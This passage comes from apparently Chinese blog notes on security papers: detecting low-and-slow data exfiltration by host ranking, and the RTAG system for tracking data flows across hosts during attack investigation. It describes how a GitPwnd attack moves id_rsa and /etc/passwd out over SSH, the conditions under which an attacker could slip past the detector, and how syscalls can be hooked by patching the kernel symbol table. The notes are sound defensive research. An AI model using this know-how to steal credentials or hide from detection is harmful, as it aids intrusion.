class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>3</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>中的直方图，我们选择的直方图块数的最优大小是：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span>十个bin，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi></mrow><annotation encoding="application/x-tex">\varphi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">φ</span></span></span></span>五个bin。</p><p>下面是对于两个数据窃取的检测结果：</p><p><img src="https://img-blog.csdnimg.cn/20200220181941863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200220181945753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200220182000464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200220182003934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="93-敏感度分析和对比评估"><a class="markdownIt-Anchor" href="#93-敏感度分析和对比评估"></a> 9.3 敏感度分析和对比评估</h2><p>若数据泄露主机140天以来的平均排名大于50，那么对于只能分析50台主机的系统来说，就难以检测到威胁。</p><p>接下来我们在不同类别的主机上，验证所提方法的有效性。</p><p>我们利用前面提到的“每台内部主机上传的字节数（per-day）”，其分布为重尾分布。实验室长为140天，每一天，我们从中选出七个具有不同上传量的主机，分别对应一个特定的分位数：0.01, 0.05, 0.25, 0.50, 0.75, 0.95, 0.99 （即将所有的主机按照数据上传量由少到多排列，r0.01表示第百分之一个主机，因此这些主机的正常数据上传量是依次递增的）。这使得我们可以评估不同的低、中、高上传者。然后，我们向这7台主机中分别注入信息窃取攻击，每天每台主机的信息窃取量包括以下八种：50 MB, 100 MB, 200 MB, 500 MB, 1 GB, 2 GB, 5 GB and 10 GB。</p><p>该实验允许我们对所有可能的信息窃取，进行全频段的分析，从low-and-slow到burst数据泄露。</p><p>普通的方法：仅仅按照数据上传量来给主机进行排名。接下来，我们分别使用我们的排名方法和普通的排名方法，对7种主机、八种数据大小全部计算了分数。对比图如下：</p><p><img src="https://img-blog.csdnimg.cn/20200220182016553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>每一列代表不同的主机，每一行代表不同的数据大小。每个单元格表示我们的方法优于普通方法的比率。比如99.29%表示在140天中，有139天本文提出的方法要优于普通方法。（i.e.会把可疑主机放在更高的排名位置）</p><p>图中我们可以看出r0.75和r0.95因数据大小不同，结果也不同。但是r0.99偏爱常规的检测方法，这是因为r0.99平时上传的数据量比较大，因此常规方法比较容易将其放在排名较高的位置（而不管数据泄露的多少）；但是本文的方法将数据泄露量作为日常数据上传的增量时，就显得微不足道了，所以较难检测出数据泄露的存在。</p><p>因此可以得到本文方法的优点：</p><ul><li>相较于普通方法，本文的方法在大多数情况下表现较好</li><li>它将原本不会被考虑的主机标注为了可疑，因为普通的方法经常会让大数据上传者占据主导地位。（废话？小数据上传者的检测还不容易吗？）</li></ul><p>下面，分别为两种方法计算<strong>排名的中位数</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200220182044661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>每个单元的数据：rx.xx表示140天中每一天对应的主机，该主机每天根据计算分数会有一个排名，每个单元的数表示这些排名的中位数。如42.50就表示在140天中，至少有一半的时间，其排名是高于42.5的。</p><p>根据不同的环境，分析威胁的能力也不同。假设第一种环境每天能分析50台主机，我们在途中用灰色表示出来；第二种环境每天能处理5台主机，我们在图中用加粗字体表示出来。比如53.50未被标位灰色，因为一共能处理50台主机，而有一半以上的情况该主机的排名是在50名开外的，在这些情况下、在第一种环境中查表查不到这台主机，因此我们认为这种情况是我们的方法没有有效处理的情况。</p><h2 id="94-结果总结"><a class="markdownIt-Anchor" href="#94-结果总结"></a> 9.4 结果总结</h2><p>相对于普通方法（common-ranking）的提升在于：</p><ul><li>对于大部分主机，都可以快速（10K host、140millions flows，in 2 mins）识别low-and-slow数据窃取</li><li>对于中、小量的数据上传者来说，检测效果明显优于普通方法</li><li>不会像普通方法那样，让大数据量上传者始终占据排名前列</li><li>即便是中、小量的数据上传者，也可以被识别为最可疑的对象</li></ul><p>对比Table 9和10的结果，可以看出common-ranking在数据窃取量低于500MB每天时，在大多数情况下都无法检测。</p><p>此外，根据Table 9，如果攻击者想绕过我们的检测系统，那么需要落在未被标位灰色的单元格内。这要求攻击者一方面要了解内部网络是数据传送情况，将数据窃取点选在r0.5-r0.95的主机之间，这不仅取决于单台主机，同时也取决于网络中其他主机的数据传送量；另一方面要控制每天的数据窃取大小。因此想要绕过我们的系统是非常困难的。</p><h1 id="10-思考"><a class="markdownIt-Anchor" href="#10-思考"></a> 10 思考</h1><h2 id="101-存在的问题"><a class="markdownIt-Anchor" href="#101-存在的问题"></a> 10.1 存在的问题</h2><ul><li>仅仅三个特征未免过于简单</li><li>实验环境中的主机在评估期间一定会遭受APT攻击吗？人为加入攻击</li><li>没有时间复杂度分析</li><li>对于大量数据上传者主机上的数据泄露检测效果不佳</li></ul><h2 id="102-未来的研究方向"><a class="markdownIt-Anchor" href="#102-未来的研究方向"></a> 10.2 未来的研究方向</h2><p>对于使用其它安全资产的关联系统，比如来组IDS的data flows和alerts，可以集成到我们的系统中。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-基于高效数据流标记和跟踪的可精炼跨主机攻击调查</title>
      <link href="/2020/02/21/PaperNote-%E5%9F%BA%E4%BA%8E%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E6%B5%81%E6%A0%87%E8%AE%B0%E5%92%8C%E8%B7%9F%E8%B8%AA%E7%9A%84%E5%8F%AF%E7%B2%BE%E7%82%BC%E8%B7%A8%E4%B8%BB%E6%9C%BA%E6%94%BB%E5%87%BB%E8%B0%83%E6%9F%A5/"/>
      <url>/2020/02/21/PaperNote-%E5%9F%BA%E4%BA%8E%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E6%B5%81%E6%A0%87%E8%AE%B0%E5%92%8C%E8%B7%9F%E8%B8%AA%E7%9A%84%E5%8F%AF%E7%B2%BE%E7%82%BC%E8%B7%A8%E4%B8%BB%E6%9C%BA%E6%94%BB%E5%87%BB%E8%B0%83%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>原文标题：Enabling Refinable Cross-Host Attack Investigation with Efficient Data Flow Tagging and Tracking</p><p>原文作者：Yang Ji, Sangho Lee, Mattia Fazzini, Joey Allen, Evan Downing, Taesoo Kim, Alessandro Orso, and Wenke Lee, Georgia Institute of Technology</p><p>原文来源：USENIX 2018</p><p>原文链接：<a href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-ji.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-ji.pdf</a></p><p>相关名词：</p><ul><li>reachability analysis：对Provenance Graph进行修剪</li><li>Interfering parts：涉及攻击的攻击部分</li><li>point-to-point analysis：前向/反向分析中数据流的特定路径，query类型之一</li><li>query：分析人员发出query，RTAG根据query类型返回结果</li><li>symbols：subjects/objects</li></ul><h1 id="1-摘要"><a class="markdownIt-Anchor" href="#1-摘要"></a> 1 摘要</h1><p>调查跨越许多主机的攻击通常具有挑战性。来自不同主机的安全敏感文件、网络终端和内存对象之间真实依赖关系，很容易被依赖爆炸或者未定义的程序行为（比如memory corruption内存损坏）所掩盖。</p><p><strong>动态信息流追踪技术</strong>（Dynamic information flow tracking (DIFT)）仅仅能够追踪单个主机上的信息流，而且在多台主机之间维护和同步数据流标签缺乏一个有效的机制。</p><p>本文提出的方法叫做<strong>RTAG</strong>，这是一种有效的<strong>数据流标记和追踪机制</strong>，可以用于实际的<strong>跨主机</strong>环境下的攻击调查。RTAG的创新技术具有以下三点：</p><ul><li><strong>记录和重放（record-and-replay）</strong>：它将不同数据流标签之间的依赖关系从分析中解耦出来，从而在不同主机的独立和并行DIFT实例之间实现延迟同步。</li><li>利用<strong>系统调用</strong>级的起源信息来计算和分配内存消耗方面的最优<strong>标签映射</strong>。</li><li><strong>将标签信息嵌入到网络数据包中</strong>，从而实现跨主机的数据流追踪，且网络带宽开销小于0.05%。</li></ul><p>通过实验验证，RTAG能够恢复跨主机攻击场景的真实数据流。性能方面，RTAG能在基于DIFT分析方法的基础上，内存消耗最多减少90%；整体分析时间与之前的分析系统相比减少60% - 90%</p><h1 id="2-介绍"><a class="markdownIt-Anchor" href="#2-介绍"></a> 2 介绍</h1><p>现存的攻击调查系统：</p><ul><li>一些通过监控<strong>系统调用</strong>级别或者<strong>指令</strong>级别的事件在每台主机上分析攻击，而<strong>忽略了跨主机</strong>的攻击</li><li>一些<strong>着眼于跨主机</strong>情景下，多主机之间的交互，但是因为他们<strong>缺乏系统调用级别</strong>的信息，所以他们的分析可能会导致<strong>依赖爆炸</strong>问题</li></ul><p>不同解决方案及其优缺点：</p><ul><li><strong>使用粗粒度信息（如系统调用）</strong>：其性能开销很小，但是即使是在单主机环境下，它也不能准确地追踪依赖爆炸和未定义的程序行为（如memory corruption）</li><li>如果<strong>使用网络会话将不同主机上的粗粒度信息联系起来</strong>：会包含太多的错误依赖</li><li><strong>使用细粒度信息（如来自DIFT的指令级别信息）</strong>：会解决准确度问题，但是将会增加开销</li><li><strong>跨主机DIFT机制</strong>：在运行时，在网络数据包中使用元数据（标签）并关联它们，也会是巨大的性能下降</li></ul><p>因此，我们提出了<strong>RTAG</strong>系统：<strong>基于记录和重放的数据流标记和追踪系统</strong>。</p><p>使用记录和重放来进行跨主机的信息流分析带来了新的<strong>挑战</strong>：</p><ul><li><strong>分析时间</strong>：DIFT分析需要以一种同步的方式，在不同主机之间传输分析数据（如标签）</li><li><strong>内存消耗</strong>：多个DIFT实例的内存消耗是巨大的，尤其是不同主机上的多个进程交互时</li></ul><p>为了解决这两个挑战，RTAG通过<strong>标签覆盖</strong>和<strong>标签切换</strong>技术<strong>将标签依赖从分析中解耦出来</strong>，并且时DIFT独立于由通信所决定的任何特定顺序。这使得DIFT分析可以在多主机、多进程并行的环境下运行。此外，RTAG通过设计<strong>标签映射数据结构</strong>减少了内存消耗，<strong>标签映射数据结构用于追踪标签和关联值之间的关系。</strong>（不懂）</p><p>评估结果表明分析时间降低了60% - 90%，内存消耗最大减少了90%。<strong>评估环境使用了真实跨主机攻击场景，包括GitPwn和SQL注入</strong>。</p><h2 id="21-主要贡献"><a class="markdownIt-Anchor" href="#21-主要贡献"></a> 2.1 主要贡献</h2><ul><li><strong>可精炼的跨主机调查标签系统</strong>：RTAG解决了“标签依赖耦合”问题，它<strong>将标签依赖解耦合</strong>，避免在重放DIFT上进行容易出错的编排工作，并使DIFT能够独立地并行执行</li><li><strong>DIFT运行优化</strong>：在重放阶段，优化了运行时间和内存。运行时间优化是通过<strong>并行运行DIFT任务</strong>；内存优化是基于<strong>系统调用级别的可达性分析</strong>，为DIFT分配<strong>最佳标签大小</strong></li></ul><h1 id="3-背景"><a class="markdownIt-Anchor" href="#3-背景"></a> 3 背景</h1><h2 id="31-执行程序日志"><a class="markdownIt-Anchor" href="#31-执行程序日志"></a> 3.1 执行程序日志</h2><p><strong>Data Granularity</strong>：Granularity refers to “the level of detail or summarisation of the units of data in the data warehouse”. The low level of granularity contains high level of detail and the high level of granularity contains low level of detail.</p><ul><li>使用<strong>高粒度数据</strong>，如系统调用，开销低，准确度低</li><li>使用<strong>低粒度数据</strong>，如指令，准确度高，开销大</li><li>结合上述二者，使用<strong>记录和重放</strong>，在记录程序运行时，执行高级别的日志记录和分析；在重放程序运行时，执行低级别的日志记录和分析</li></ul><h2 id="32-记录和重放"><a class="markdownIt-Anchor" href="#32-记录和重放"></a> 3.2 记录和重放</h2><p>该技术的目的是记录软件执行时的信息，并利用存储的信息，<strong>重新执行软件并重构程序状态</strong>，其执行路径跟初次执行时一样。</p><p>根据执行记录重放任务系统的层次，进行以下分类：</p><ul><li><strong>在用户层执行程序</strong>：在重放阶段效率较高，因为它可以直接将注意力放在特定程序的记录信息上，然而这种技术需要程序源码或者二进制代码，或者需要额外的空间来记录通信程序的执行(特别是通过文件系统)，因为记录的信息要存储多次。</li><li>通过<strong>观察操作系统的行为</strong>来进行记录和重放：通过管理程序（hypervisor）或仿真来监视OS，在存储信息方面非常高效，然而即便是在只有一个程序是与攻击相关的情况下，该方法也得将所有程序重放一遍。</li><li><strong>前两种方式的融合</strong>：在OS级别记录信息，在用户级别重放。</li></ul><h2 id="33-dift"><a class="markdownIt-Anchor" href="#33-dift"></a> 3.3 DIFT</h2><p>DIFT是一种在执行程序内分析数据流的技术，具体包括以下几点：</p><ul><li>用“标签”标记程序中感兴趣的value</li><li>通过处理指令传播标签</li><li>在程序执行中的某些特定的点，检查与value相关联的标签</li></ul><p>该技术可以准确地判断程序的两个value之间是否有关联。然而，因为它需要对每个执行指令进行额外的操作，因此会有较大的开销。</p><p><img src="https://img-blog.csdnimg.cn/20200215230551658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>上图比较了序列化的DIFTs（串行）和RTAG加持的并行DIFTs；</p><ul><li>(a) 展示了在服务器上的ssh守护进程和另一台主机上的ssh客户端，两者都遵循相同的标签依赖（<strong>标签依赖在记录阶段被记录下来，DIFTs用它进行重放</strong>）</li><li>(b) 中RTAG使用标签切换、分配和关联技术，将标签依赖从程序重放中解耦出来，从而使得每个进程在线下分析时可以并行</li></ul><h1 id="4-攻击实例和挑战"><a class="markdownIt-Anchor" href="#4-攻击实例和挑战"></a> 4 攻击实例和挑战</h1><h2 id="41-攻击实例"><a class="markdownIt-Anchor" href="#41-攻击实例"></a> 4.1 攻击实例</h2><p>攻击实例使用GitPwnd，其行动包括多主机的文件窃取。链接：<a href="https://github.com/nccgroup/gitpwnd" target="_blank" rel="noopener">https://github.com/nccgroup/gitpwnd</a>.</p><p>在服务器端使用<a href="https://www.gitolite.com" target="_blank" rel="noopener">gitolite</a>，在客户端使用git。</p><h2 id="42-挑战"><a class="markdownIt-Anchor" href="#42-挑战"></a> 4.2 挑战</h2><p><strong>跨主机的数据流追踪所面临的挑战是：同时满足准确度和效率。</strong></p><p>目前支持跨主机的数据流捕获系统，在运行时使用DIFT，它在程序执行的主机和另外的主机之间传播标签，而不会丢弃任何标签和他们之间的依赖关系。然而这样的系统会有很大的开销。</p><p>为了同时满足准确度和效率，<strong>可精炼的系统（refinable system）<strong>首先记录每个程序的执行过程，然后使用DIFT有选择性地（与攻击相关）重放它们。然而，目前的refinable system面临的挑战是</strong>标签依赖性问题</strong>：也就是说，<strong>这种系统需要进行重放，但是在重放过程中，如果不同重放进程的标签之间存在依赖关系，那么重放必须按照与记录相同的顺序来进行。所以这种必须按顺序执行的方式就要求，DIFT任务们必须等待其上游的DIFTs来更新它们所依赖的标签，在我们所面临的多主机场景下，这种挑战更加明显</strong>（精辟啊！！理解解耦的意思了嘛？）。</p><p>下面时GitPwnd的一个例子，来形象地阐述这种挑战。在服务器端，需要暂停sshd的重放，等待客户端的ssh-client的重放，以完成流量在Tagmap中的传播结果。此外，sshd将使用此流量作为ssh协议响应来回应ssh，这意味着需要暂停ssh的重放并等待sshd。</p><p><img src="https://img-blog.csdnimg.cn/20200215230603189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>当存在多个通信参与者时，这种挑战就更加严重了。例如，在一个P2P的文件共享系统中执行搜索和下载文件操作，我们需要在每个节点上编排P2P客户客户端的重放工作，当面对成千上百个节点是，这是非常不切实际的。</p><p>为了解决这个问题，本文提出的RTAG，使用<strong>符号化标签</strong>(symbolized tags) 为每个独立的DIFT实例分配合适大小的标签，将标签依赖从重放过程中解耦出来。</p><h1 id="5-概述"><a class="markdownIt-Anchor" href="#5-概述"></a> 5 概述</h1><p>RTAG，将标签依赖从分析过程中（DIFT任务）解耦出来，使得DIFT独立于任何特定的顺序，允许为不同主机上不同进程并行运行DIFT，在离线分析时，这种独立性避免了按照特定顺序实时的复杂性。</p><ul><li><strong>标签覆盖</strong>（tagging overlay）：RTAG在传统的<strong>起源图</strong>（provenance）上维护一个<strong>标签覆盖</strong>（tagging overlay），从而独立准确地进行标签管理</li><li><strong>标签切换</strong>（tag switch）：用于交换跨<strong>主机唯一的全局标签</strong>（global tag）和对<strong>DIFT实例唯一的本地标签</strong>（local tag）。为每个DIFT实例使用一个本地标签，这可以解开标签之间的耦合，因为之前时不同的DIFT任务共享这些标签的。DIFT完成后，RTAG将<strong>本地符号</strong>（local symbol？）切换回它原来的全局标记。</li><li><strong>Version</strong>：在某段数据的标签更新不止一次的时候，为了确保标签及其传播不会丢失，RTAG根据系统范围内的写操作，跟踪数据的每个更改(version)。每段数据版本都有它自己的标签，每个标签值的版本都会被正确地传播到其他的数据片段。</li></ul><p>（不懂）RTAG不仅可以通过独立运行DIFT使分析速度得到提升，而且会减少内存消耗。我们使用最佳的符号大小，为每个DIFT分配本地符号，这足以表示涉及内存重叠的数据的<strong>熵</strong>（entropy）。</p><ul><li><strong>标签关联</strong>（tag association）：映射主机之间字节级的数据收发，这有助于识别跨主机的标签传播。</li></ul><h1 id="6-威胁模型和假设"><a class="markdownIt-Anchor" href="#6-威胁模型和假设"></a> 6 威胁模型和假设</h1><p>本文的目标：<strong>通过DIFT建立一个可精炼的跨主机攻击调查系统</strong>。</p><p>文章所使用的威胁模型：攻击者有机会远程接入受害者网络，尝试窃取敏感数据，并在主机之间传播错误信息（如篡改数据）。</p><p>本文的<strong>可信计算基础</strong>（trusted computing base，TCB）包括内核、存储、网络。</p><p>假设：</p><ul><li>在RTAG启动之后攻击才发生</li><li>硬件攻击不在本文考虑范围之内</li><li>攻击者不会攻击RTAG本身和操作系统，不会篡改RTAG所用到的数据（通过安全日志机制实现，或者将数据存在远程分析服务器上）</li><li>攻击者不会篡改主机之间传播的数据包载荷</li></ul><h1 id="7-标签系统"><a class="markdownIt-Anchor" href="#7-标签系统"></a> 7 标签系统</h1><h2 id="71-表示数据流和因果关系tag-overlay"><a class="markdownIt-Anchor" href="#71-表示数据流和因果关系tag-overlay"></a> 7.1 表示数据流和因果关系（tag overlay）</h2><p>为了追踪跨主机的不同文件或网络数据流，我们建立了一个<strong>标签模型</strong>，它作为一个<strong>覆盖图</strong>（overlay graph）覆盖在现有的起源图之上。</p><p>在覆盖图内，RTAG将全局唯一的标签和感兴趣文件相关联，以字节级别（<strong>byte-level</strong>）的粒度来追踪它们的起源和流动。标签使得RTAG可以反向追踪文件的起源，包括从远端主机传来的文件；还能够前向追踪文件造成的影响，也可以包括传向远端主机的文件。（SLEUTH中的回溯分析取证和前向影响性分析）</p><p>起源图需要追踪以下的信息流：</p><ul><li>从进程到文件</li><li>从进程到另一个进程</li><li>从文件到进程</li></ul><p>起源图中的边表示两个节点之间的事件（如进程节点从文件节点读数据的一个系统调用）</p><p>在标签覆盖图（overlay tag graph）中，文件的每个<strong>字节</strong>都对应一个<strong>标签键</strong>（tag key），用于唯一标识这一字节。每个标签键都与此键的原始值向量相关联。通过递归检索键的值，可以获得从这个数据字节开始的所有上游起始点，该点以树的形式扩展到远程主机上的起始点。相反，通过递归检索值的标签键，分析人员能够在树状图中找到所有影响，包括远程主机上的影响。（正向与反向分析）下图是一个例子：<br /><img src="https://img-blog.csdnimg.cn/20200215230638218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>RTAG需要在每台主机的文件系统，<strong>使用全局标签（global tag）来唯一标识数据的每个字节</strong>。出于这个需要，我们使用mac地址来标识主机，使用inode、dev、crtime来标识文件，使用偏移量（offset）来标识文件中<strong>字节级</strong>的偏移量。例如，mac地址占48 bits，inode、dev、crtime分别占64、32、32 bits，偏移量占32 bits，可支持的文件大小就是4GB（offset=32，2的32次方字节），全局标签的总大小就是208 bits。</p><h2 id="72-跨主机可达性分析修剪"><a class="markdownIt-Anchor" href="#72-跨主机可达性分析修剪"></a> 7.2 跨主机可达性分析（修剪）</h2><p><strong>RTAG遵循<a href="https://dl.acm.org/doi/pdf/10.1145/3133956.3134045?download=true" target="_blank" rel="noopener">RAIN</a>的可达性分析设计，并且将其扩展至可以处理跨主机的场景</strong>。</p><p>给定一个起始点，RTAG通过削减原始的起源图，以提取与指定攻击相关的子图，该子图包含进程和文件/网络流之间的因果关系。RTAG依赖于此子图中的<strong>粗粒度数据流</strong>来维护标签覆盖，同时执行标签切换和最优分配。</p><p>（不懂。分析内存重叠的不可达情况？？）可达性分析首先遵循基于时间的数据流，以了解攻击中涉及的潜在过程。接下来，它捕获每个进程内部文件或网络的输入/输出的<strong>内存重叠</strong>(拷贝的目的地址在源地址范围内。所谓内存重叠就是拷贝的目的地址和源地址有重叠。)，并将它们标记为“干扰”，由DIFT进行处理。在干扰信息准确的情况下，重放和DIFT被快速转发到干扰开始处(例如，read系统调用)，并在干扰结束处提前终止(例如，write系统调用)。</p><p>对于跨主机的网络通信，RTAG通过socket来练习数据流。进一步，RTAG通过TCP和UDP协议的套接字通信进一步跟踪字节级别的数据传输，这使得扩展跨主机的标记传播成为可能</p><p>由于RTAG从记录的文件/网络 IO 系统调用中获得了关于源和目的信息，因此可以为每个独立的DIFT任务分配最优的标签大小。</p><p>另外，此外，为了<strong>避免丢失</strong>由不同进程执行的、对同一资源的<strong>中间标签更新</strong>，RTAG监视对文件的相同偏移量的“<strong>覆盖</strong>”操作，并<strong>跟踪这个版本信息</strong>，因此它准确地知道应该在传播中使用哪个版本的标签。</p><h2 id="73-解耦标签依赖local-tags"><a class="markdownIt-Anchor" href="#73-解耦标签依赖local-tags"></a> 7.3 解耦标签依赖（local tags）</h2><p>RTAG的目标是<strong>使用DIFT进行离线重放</strong>，而不增加程序运行的开销。为了使其支持跨主机环境，我们要解决的问题是如何协调不同主机上的重放程序，来追踪他们之间的标签依赖。解决方案是将标签依赖从每个进程重放过程中解耦出来，为此我们为每个DIFT使用<strong>本地标签</strong>（local tags）（也就是符号化symbolized），这需要在写作操的之前和之后来区别标签的变化，并且向其它相关的标签同步这些变化。换句话说，RTAG需要在每次IO操作之后，追踪每个标签的原始版本的动态变化（标签的多个版本）。</p><p>用下图GitPwnd的例子来说明：<br /><img src="https://img-blog.csdnimg.cn/20200215230653635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>（<strong>详解GitPwnd</strong>）client-hook守护进程持续从不同的文件读取数据，并保存在result文件中。同时，当受害之执行git commit操作时，git packet应用从results文件进行复制，然后通过pipe IPC（Inter-Process Communication）用SSH发送出去。为了正确地分辨下列两个数据流：</p><ul><li>id_rsa→results→pipe</li><li>/etc/passwd→results→pipe</li></ul><p>RTAG需要为results维护两个版本的标签，client-hook上的DIFT为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>s</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">id\_rsa</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span></span></span></span>存储的表示其来源的标签为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>v</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">results.v1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord">1</span></span></span></span>，为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>t</mi><mi>c</mi><mi mathvariant="normal">/</mi><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">etc/passwd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">c</span><span class="mord">/</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">d</span></span></span></span>存储的表示其来源的标签为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>v</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">results.v2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord">2</span></span></span></span>（图中用红色虚线表示）；因此git pack上的DIFT可以分辨 git:ssh 数据的来源：</p><ul><li>偏移量为0来自 results.v1，也就是来自 id_rsa</li><li>偏移量为1024来自 results.v2，也就是来自 etc/passwd</li></ul><p>更重要的是，这个时候client-hook和git pack上的DIFT任务就可以独立执行了，而不会由于在results文件上的重写而导致中间标签值的丢失。</p><p>为了更加方便地支持这种标签化，我们附加了一个32位的<strong>版本字段</strong>（version field），用来表示文件中有关文件IO操作的数据的版本。仅仅在由可达性分析所决定的的数据干扰出现时，才会使用版本字段。通过实验，我们为版本字段分配32 bits的长度，可以在500天的实验环境中精确找出IO 系统调用。</p><p>（知识点补充）hook系统调用：其实就是修改内核符号表，来达到一个劫持的作用。因为系统调用实际上是触发了一个0x80的软中断，然后转到了系统调用处理程序的入口system_call()。system_call()会检查系统调用号来得出到底是调用哪种服务，然后会根据内核符号表跳转到所需要调用的内核函数的入口地址，所以，如果我们这个时候修改了内核符号表，使其跳转到我们自己的函数上，就可以完成劫持。</p><h2 id="74-切换全局和本地标签"><a class="markdownIt-Anchor" href="#74-切换全局和本地标签"></a> 7.4 